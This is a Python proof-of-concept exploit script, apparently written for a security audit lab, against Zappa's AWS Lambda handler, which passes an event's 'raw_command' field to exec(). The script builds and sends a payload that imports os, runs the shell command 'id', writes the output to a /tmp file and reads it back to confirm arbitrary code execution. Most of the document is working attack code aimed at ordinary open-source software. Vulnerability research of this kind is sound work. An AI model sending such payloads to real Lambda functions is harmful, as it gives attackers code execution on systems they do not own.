#!/usr/bin/env python3
"""VULN-001 — `raw_command` event field passed straight to exec() (RCE).

Vulnerable code : targets/Zappa/zappa/handler.py:914-920
Vulnerability   : CWE-94/CWE-95 Code Injection (eval/exec of untrusted data).
Surface         : B (direct Lambda invocation) — any-AWS-account via VULN-012's public Function URL.

Mechanism (plain English)
-------------------------
The handler has a branch that runs an event-supplied string as Python, verbatim:

    elif event.get("raw_command", None):
        raw_command = event["raw_command"]
        exec(raw_command)                       # handler.py:919 — no sandbox, module globals

`exec` runs with the handler module's globals (os, sys, json, ... are imported),
so the event string can import anything and run shell commands. Whoever can invoke
the function with a `raw_command` event executes arbitrary code inside it.

Exploitation idea
-----------------
Send `{"raw_command": "<python>"}`. Here the payload shells out to `id` and writes
the output to a uniquely-named file, which we then read back to prove execution.

What a successful run proves
----------------------------
An event-supplied Python string executed inside the Lambda process and ran an OS
command (`id`), whose real output we recover — arbitrary code execution.
"""
import os
import secrets
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import banner, lab_exec, log, raw_event, verdict

VULN = "VULN-001"


def main():
    banner(VULN, "raw_command event field -> exec() RCE",
           "zappa/handler.py:919 exec(event['raw_command'])")

    sfx = secrets.token_hex(4)                     # random marker so re-runs never collide
    marker = f"/tmp/vuln001_rce_{sfx}"
    # The payload imports os and runs a real OS command, writing its output to a file.
    payload = (
        "import os\n"
        f"open({marker!r}, 'w').write('uid=' + str(os.getuid()) + ' | ' + os.popen('id').read())\n"
    )
    log("STEP", f'sending {{"raw_command": ...}} that runs `id` and writes {marker}')
    raw_event({"raw_command": payload})

    # Recover the file the injected code wrote (proves it executed in the Lambda process).
    cp = lab_exec(["cat", marker])
    out = cp.stdout.decode().strip()
    log("INFO", f"contents of {marker}: {out!r}")

    if cp.returncode == 0 and "uid=" in out:
        log("PROOF", f"the event's raw_command executed inside the function: it ran the OS command `id` and "
                     f"wrote its output ({out!r}) to disk — arbitrary code + shell execution from an event field.")
        log("OK", "exploit confirmed — raw_command -> exec() -> OS command execution")
        # cleanup hint: rm the marker file inside the container if desired (left for inspection).
        lab_exec(["rm", "-f", marker])
        verdict("CONFIRMED", f"{VULN}: CONFIRMED — event raw_command -> exec() RCE (Surface B)")
        return 0
    log("FAIL", f"marker not written / no uid (rc={cp.returncode}, stderr={cp.stderr.decode()[-200:]})")
    verdict("FAILED", f"{VULN}: FAILED")
    return 1


if __name__ == "__main__":
    sys.exit(main())
